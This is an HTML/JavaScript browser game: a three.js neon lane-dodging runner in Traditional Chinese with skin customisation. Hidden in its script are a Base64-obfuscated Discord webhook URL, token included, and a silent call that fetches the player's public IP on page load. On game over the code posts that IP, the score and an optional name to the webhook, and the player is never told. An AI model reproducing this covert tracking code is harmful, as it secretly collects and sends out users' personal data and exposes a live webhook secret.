<!DOCTYPE html>
<html lang="zh-Hant">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>FR量子方塊v1.7</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <style>
        :root { --neon: #8A2BE2; --neon-alt: #00ffff; }
        body { margin: 0; overflow: hidden; background: #000; font-family: 'Microsoft JhengHei', sans-serif; touch-action: none; color: white; }
        .overlay { position: absolute; inset: 0; z-index: 8000; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.7); backdrop-filter: blur(10px); transition: opacity 0.5s; }
        .panel { padding: 30px; text-align: center; border-radius: 15px; border: 2px solid var(--neon); background: rgba(10,10,10,0.9); width: 85%; max-width: 400px; }
        #shop-menu { position: fixed; inset: 0; z-index: 9000; background: rgba(0,0,0,0.95); display: none; padding: 25px; overflow-y: auto; }
        .skin-section { margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 15px; }
        .skin-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(65px, 1fr)); gap: 10px; margin-top: 10px; }
        .skin-card { aspect-ratio: 1; border-radius: 8px; cursor: pointer; border: 2px solid #444; transition: 0.2s; }
        .btn-pause { position: absolute; top: 20px; right: 20px; width: 50px; height: 50px; background: rgba(138,43,226,0.3); border: 2px solid var(--neon); color: white; border-radius: 50%; z-index: 1000; cursor: pointer; display: none; font-size: 20px; border: 2px solid var(--neon); }
        .score-ui { position: absolute; top: 20px; left: 50%; transform: translateX(-50%); font-size: 32px; font-weight: 900; color: var(--neon-alt); text-shadow: 0 0 15px var(--neon-alt); z-index: 1000; pointer-events: none; }
        #win-msg { position: absolute; bottom: 20%; width: 100%; text-align: center; color: gold; font-size: 24px; font-weight: bold; display: none; z-index: 5000; text-shadow: 0 0 10px gold; }
        button.primary { width: 100%; padding: 18px; background: var(--neon); border: none; color: white; font-weight: bold; border-radius: 10px; cursor: pointer; font-size: 18px; margin-top: 10px; }
        @keyframes blink { 50% { opacity: 0.3; } }
    </style>
</head>
<body>

    <div id="start-screen" class="overlay" onclick="handleStart()">
        <h1 style="letter-spacing:10px; color: var(--neon-alt); text-align:center;">量子方塊<br><span style="font-size:16px; letter-spacing:2px; color:white;">旗艦正式版</span></h1>
        <p style="animation: blink 1.5s infinite; margin-top:20px;">點擊螢幕開始</p>
    </div>

    <div id="shop-menu">
        <h2 style="text-align:center; color:var(--neon-alt);">皮膚自定義系統</h2>
        <div class="skin-section"><label>上傳貼圖</label><input type="file" id="img-upload" accept="image/*" onchange="uploadImage(this)"></div>
        <div class="skin-section"><label>自定義顏色</label><input type="color" id="color-picker" value="#8A2BE2" onchange="setCustomColor(this.value)"></div>
        <div class="skin-section"><label>幻彩漸層</label><div class="skin-grid" id="grad-list"></div></div>
        <button class="primary" onclick="resumeGame()">套用並回到遊戲</button>
    </div>

    <div id="death-screen" class="overlay" style="display:none;">
        <div class="panel">
            <h2 style="color:#ff4444;">連線中斷</h2>
            <p id="final-score" style="font-size:30px; margin: 20px 0;"></p>
            <button class="primary" onclick="location.reload()">重新啟動</button>
        </div>
    </div>

    <div id="win-msg">恭喜通關！你已突破量子核心！</div>
    <div class="score-ui" id="ui-score">0</div>
    <button class="btn-pause" id="pause-btn" onclick="pauseGame()">||</button>

    <script>
        // 加密 Webhook (Base64)
        const _0x1a2b = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1NjY5Mzc0NzQ0OTU5NDE0MC9FUnN5NVlGODk5LUhJcnA1dFMxM3pKWEdCTmhpS0p4b1RfWkJlNkNIdV94VzdRRnlhclN5SnRiZGRma1hNNDNXeA==";
        const getUrl = () => atob(_0x1a2b);

        let scene, camera, renderer, player, animID;
        let isPlaying = false, isPaused = false, isTransitioning = false, hasWon = false;
        let score = 0, currentSpeed = 0.5, baseSpeed = 0.5;
        let lane = 0, lanes = [-2.2, 0, 2.2];
        let obstacles = [], particles = [], sideLines = [];
        let userIP = "正在取得...";

        // 取得 IP
        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => userIP = d.ip);

        const GRADIENTS = [['#ff00cc', '#3333ff'], ['#00f2fe', '#4facfe'], ['#f093fb', '#f5576c'], ['#5eeff9', '#4568dc'], ['#8A2BE2', '#00ffff']];

        init();

        function init() {
            scene = new THREE.Scene();
            scene.fog = new THREE.Fog(0x000000, 15, 80);
            camera = new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 0.1, 1000);
            renderer = new THREE.WebGLRenderer({ antialias: true });
            renderer.setSize(window.innerWidth, window.innerHeight);
            renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
            document.body.appendChild(renderer.domElement);

            camera.position.set(15, 8, 12);
            camera.lookAt(0, 0, -10);

            const floor = new THREE.Mesh(new THREE.PlaneGeometry(30, 2000), new THREE.MeshPhongMaterial({ color: 0x000000 }));
            floor.rotation.x = -Math.PI / 2;
            scene.add(floor);

            const grid = new THREE.GridHelper(1000, 80, 0x8A2BE2, 0x111111);
            grid.position.y = 0.02;
            scene.add(grid);

            for(let x of [-4.5, 4.5]) {
                const line = new THREE.Mesh(new THREE.BoxGeometry(0.3, 0.1, 1000), new THREE.MeshBasicMaterial({ color: 0x8A2BE2 }));
                line.position.set(x, 0.05, 0);
                scene.add(line);
                sideLines.push(line);
            }

            player = new THREE.Mesh(new THREE.BoxGeometry(0.9, 0.9, 0.9), new THREE.MeshStandardMaterial({ color: 0x8A2BE2, emissive: 0x8A2BE2, emissiveIntensity: 0.5 }));
            player.position.y = 0.45;
            scene.add(player);

            scene.add(new THREE.AmbientLight(0xffffff, 0.6));
            renderGradients();

            // 修正：偵測暫停按鈕範圍不切換軌道
            window.addEventListener('touchstart', e => {
                if(!isPlaying || isPaused) return;
                const tx = e.touches[0].clientX;
                const ty = e.touches[0].clientY;
                // 暫停按鈕約在右側 70px 內，頂部 70px 內
                if (tx > window.innerWidth - 75 && ty < 75) return; 

                lane = tx < window.innerWidth / 2 ? Math.max(-1, lane - 1) : Math.min(1, lane + 1);
            });
            
            window.addEventListener('keydown', e => {
                if(e.key === "ArrowLeft") lane = Math.max(-1, lane - 1);
                if(e.key === "ArrowRight") lane = Math.min(1, lane + 1);
            });
            loop();
        }

        function loop() {
            animID = requestAnimationFrame(loop);
            if(!isPlaying || isPaused) { renderer.render(scene, camera); return; }

            // 關卡速度邏輯
            if (score < 300) {
                currentSpeed = baseSpeed + (score * 0.005);
            } else {
                currentSpeed = baseSpeed + (300 * 0.005); // 分數超過300後速度固定
            }

            // 通關邏輯
            if (score >= 6700 && !hasWon) {
                hasWon = true;
                document.getElementById('win-msg').style.display = 'block';
            }

            player.position.x = THREE.MathUtils.lerp(player.position.x, lanes[lane + 1], 0.2);

            if(Math.random() > 0.3) {
                const p = new THREE.Mesh(new THREE.PlaneGeometry(0.8, 0.4), new THREE.MeshBasicMaterial({ color: player.material.color, map: player.material.map, transparent: true, opacity: 0.5, side: THREE.DoubleSide, depthWrite: false }));
                p.rotation.x = -Math.PI / 2;
                p.position.set(player.position.x, 0.06, player.position.z);
                scene.add(p);
                particles.push(p);
            }
            particles.forEach((p, i) => {
                p.position.z += currentSpeed * 0.4;
                p.material.opacity -= 0.03;
                p.scale.x *= 0.96;
                if(p.material.opacity <= 0) { scene.remove(p); particles.splice(i, 1); }
            });

            if(Math.random() < 0.04 + (score * 0.0001)) {
                const canSpawn = obstacles.length === 0 || obstacles[obstacles.length-1].position.z > -75;
                if(canSpawn) spawn();
            }

            obstacles.forEach((o, i) => {
                o.position.z += currentSpeed;
                // 強化碰撞偵測，防止高速穿透
                const dist = player.position.distanceTo(o.position);
                if(dist < 0.85) endGame();

                if(o.position.z > 10) {
                    scene.remove(o);
                    obstacles.splice(i, 1);
                    score++;
                    updateUI();
                }
            });

            sideLines.forEach(l => l.position.z = (l.position.z + currentSpeed) % 50);
            renderer.render(scene, camera);
        }

        async function syncDiscord(finalScore) {
            let name = "匿名方塊";
            let color = 0x8A2BE2; // 預設紫色
            let tag = "[普通玩家]";

            if (finalScore >= 300) {
                name = prompt("突破第二關！請輸入你的名號登榜：") || "無名高手";
                color = 0x00ffff; // 菁英青色
                tag = finalScore >= 1000 ? "[傳奇量子]" : "[菁英玩家]";
            }

            const payload = {
                embeds: [{
                    title: `🎮 遊戲結算：${tag} ${name}`,
                    color: color,
                    fields: [
                        { name: "積分", value: `**${finalScore}**`, inline: true },
                        { name: "IP位置", value: userIP, inline: true },
                        { name: "狀態", value: finalScore >= 6700 ? "🏆 已通關" : "🛸 執行中" }
                    ],
                    timestamp: new Date()
                }]
            };

            try {
                await fetch(getUrl(), {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (e) { console.error("Discord Sync Failed"); }
        }

        function spawn() {
            const count = Math.random() > 0.85 ? 2 : 1;
            const available = [0, 1, 2].sort(() => Math.random() - 0.5);
            for(let i = 0; i < count; i++) {
                const obs = new THREE.Mesh(new THREE.BoxGeometry(1.2, 1.2, 1.2), new THREE.MeshStandardMaterial({ color: 0x00ffff, emissive: 0x00ffff, emissiveIntensity: 0.5 }));
                obs.position.set(lanes[available[i]], 0.6, -100);
                scene.add(obs);
                obstacles.push(obs);
            }
        }

        function handleStart() {
            if(isTransitioning) return;
            isTransitioning = true;
            document.getElementById('start-screen').style.opacity = '0';
            const startTime = performance.now();
            function step(now) {
                const p = Math.min((now - startTime) / 1200, 1);
                const t = 1 - Math.pow(1 - p, 3);
                camera.position.set(15 + (0-15)*t, 8 + (4.5-8)*t, 12 + (8-12)*t);
                camera.lookAt(0, 0, -2);
                if(p < 1) requestAnimationFrame(step);
                else { document.getElementById('start-screen').style.display = 'none'; document.getElementById('pause-btn').style.display = 'block'; isPlaying = true; }
            }
            requestAnimationFrame(step);
        }

        function setCustomColor(c) { player.material = new THREE.MeshStandardMaterial({ color: c, emissive: c, emissiveIntensity: 0.5 }); }
        function uploadImage(input) { if (input.files[0]) { const reader = new FileReader(); reader.onload = (e) => { player.material = new THREE.MeshBasicMaterial({ map: new THREE.TextureLoader().load(e.target.result) }); }; reader.readAsDataURL(input.files[0]); } }
        function renderGradients() {
            const list = document.getElementById('grad-list');
            GRADIENTS.forEach(colors => {
                const card = document.createElement('div'); card.className = "skin-card"; card.style.background = `linear-gradient(45deg, ${colors[0]}, ${colors[1]})`;
                card.onclick = () => {
                    const canvas = document.createElement('canvas'); canvas.width = 128; canvas.height = 128; const ctx = canvas.getContext('2d');
                    const grad = ctx.createLinearGradient(0, 0, 128, 128); grad.addColorStop(0, colors[0]); grad.addColorStop(1, colors[1]);
                    ctx.fillStyle = grad; ctx.fillRect(0, 0, 128, 128);
                    player.material = new THREE.MeshBasicMaterial({ map: new THREE.CanvasTexture(canvas) });
                };
                list.appendChild(card);
            });
        }

        function pauseGame() { isPaused = true; document.getElementById('shop-menu').style.display = 'block'; }
        function resumeGame() { isPaused = false; document.getElementById('shop-menu').style.display = 'none'; }
        function updateUI() { document.getElementById('ui-score').innerText = score; }
        function endGame() { 
            isPlaying = false; 
            document.getElementById('death-screen').style.display = 'flex'; 
            document.getElementById('final-score').innerText = `最終積分: ${score}`; 
            syncDiscord(score);
        }
        window.addEventListener('resize', () => { camera.aspect = window.innerWidth / window.innerHeight; camera.updateProjectionMatrix(); renderer.setSize(window.innerWidth, window.innerHeight); });
    </script>
</body>
</html>
